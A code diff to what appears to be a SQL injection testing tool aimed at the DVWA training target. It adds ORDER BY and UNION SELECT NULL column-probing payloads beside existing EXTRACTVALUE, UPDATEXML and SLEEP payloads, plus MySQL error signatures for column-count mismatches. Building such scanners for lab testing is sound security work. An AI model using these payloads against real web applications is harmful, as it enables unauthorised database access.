@@ -46,6 +46,11 @@ ERROR_BASED_PAYLOADS: list[str] = [
     '{base}"',
     "{base}' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- -",
     "{base}' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)-- -",
+    "{base}' ORDER BY 100-- -",
+    "{base} ORDER BY 100-- -",
+    "{base}' UNION SELECT NULL-- -",
+    "{base}' UNION SELECT NULL,NULL-- -",
+    "{base}' UNION SELECT NULL,NULL,NULL-- -",
 ]
 
 # SLEEP()으로 응답 지연을 유도하는 페이로드
@@ -54,7 +59,6 @@ TIME_BASED_PAYLOADS: list[str] = [
     "{base} AND SLEEP(5)-- -",
 ]
 
-# DVWA(MySQL/MariaDB) 기준 DB 에러 시그니처. 필요시 다른 DBMS 패턴 추가.
 DB_ERROR_KEYWORDS: tuple[str, ...] = (
     "you have an error in your sql syntax",
     "warning: mysql",
@@ -67,6 +71,8 @@ DB_ERROR_KEYWORDS: tuple[str, ...] = (
     "division by zero",
     "duplicate entry",
     "xpath syntax error",
+    "the used select statements have a different number of columns",
+    "column count doesn't match",
 )
 
 
